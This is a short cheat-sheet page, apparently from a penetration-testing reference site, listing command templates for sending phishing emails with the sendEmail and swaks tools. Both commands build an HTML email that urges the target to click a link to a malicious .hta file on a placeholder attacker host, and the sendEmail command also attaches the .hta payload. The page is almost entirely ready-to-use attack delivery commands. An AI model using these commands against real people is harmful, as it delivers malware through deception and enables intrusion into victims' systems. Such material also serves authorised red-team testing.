---
title: Send Emails Commands
sidebar_position: 1
---

Commands and techniques for sending phishing emails.

### SendEmail
```bash
sendEmail -s [SMTP_SERVER_IP] -t [TARGET_ADDRESS] -f attacker@test.com -u "Subject: Issues with mail" -o message-content-type=html -m "Please click here http://[ATTACKER_IP]/[MAL_FILE].hta" -a [MAL_FILE].hta
```
###  Swaks
```bash
swaks --body 'Please click here http://[ATTACKER_IP]/[MAL_FILE].hta' --add-header "MIME-Version: 1.0" --add-header "Content-Type: text/html" --header "Subject: Issues with mail" -t [TARGET_ADDRESS] -f attacker@test.com --server [SMTP_SERVER_IP]

